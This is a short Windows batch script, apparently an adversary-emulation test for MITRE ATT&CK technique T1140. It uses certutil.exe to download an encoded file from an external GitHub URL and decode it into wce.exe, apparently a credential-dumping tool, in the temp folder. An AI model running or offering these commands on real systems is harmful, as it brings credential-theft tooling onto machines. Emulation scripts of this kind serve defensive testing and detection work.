
@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Deobfuscate/Decode Files Or Information (T1140)
ECHO.
ECHO [+] Using 'Certutil.exe' to Download and Decode a binary
ECHO -------------------------------------------------------------------
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/greycel/poc/master/wce.txt %temp%/wce.txt
certutil.exe  -decode %temp%/wce.txt %temp%/wce.exe
ECHO.



